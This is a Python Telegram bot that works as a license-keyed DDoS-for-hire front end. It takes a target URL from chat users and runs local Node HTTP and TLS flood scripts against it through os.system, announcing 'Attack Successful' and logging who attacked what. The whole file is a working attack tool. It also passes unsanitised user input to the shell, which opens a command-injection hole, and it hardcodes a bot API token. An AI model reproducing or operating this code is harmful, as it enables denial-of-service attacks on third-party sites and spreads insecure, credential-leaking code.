import telebot
import os

bot = telebot.TeleBot("6973346425:AAHMzz1p4avj_HfOcMotmwjkioLXctfeb9M")

@bot.message_handler(commands=['key', 'tls', 'http'])
def ddos_command(message):
    command = message.text.split()[0]
    user_id = message.from_user.id
    username = message.from_user.username

    if command == '/key':
        if len(message.text.split()) < 2:
            bot.reply_to(message, "Vui lòng nhập key sau lệnh /key.")
        else:
            if check_key(message):
                bot.reply_to(message, "Key hợp lệ. Vui lòng nhập lệnh ddos.")
            else:
                bot.reply_to(message, "Sai key. Vui lòng thử lại.")
    elif command == '/tls' or command == '/http':
        if len(message.text.split()) < 2:
            bot.reply_to(message, "Vui lòng nhập URL sau lệnh ddos.")
        else:
            if command == '/http':
                url = message.text.split()[1]
                bot.reply_to(message, f"┏━━━━━━━━━━━━━━┓\n┃   Attack Successful!!!\n┗━━━━━━━━━━━━━━➤\n  ┏➤Admin: NBDH \n  ➤ Tấn Công Bởi : {username} \n  ➤ Host : {url} \n  ➤ TIME : 120 \n  ➤ Methods : HTTP ")
                os.system(f"node /sdcard/Download/http3.js {url} proxy.txt")
                
            elif command == '/tls':
                url = message.text.split()[1]
                bot.reply_to(message, f"┏━━━━━━━━━━━━━━┓\n┃   Attack Successful!!!\n┗━━━━━━━━━━━━━━➤\n  ┏➤Admin: NBDH \n  ➤ Tấn Công Bởi : {username} \n  ➤ Host : {url} \n  ➤ TIME : 120 \n  ➤ Methods : TLS ")
                os.system(f"node tls.js {url} 120 64 5")
                
            
            with open('Webhook.txt', 'a') as file:
                file.write(f"{user_id}|@{username}|{command}|{url}\n")

def check_key(message):
    user_key = message.text.split()[1]
    with open('license.txt', 'r') as file:
        for line in file:
            if user_key == line.strip():
                return True
        return False

if __name__ == '__main__':
    bot.polling()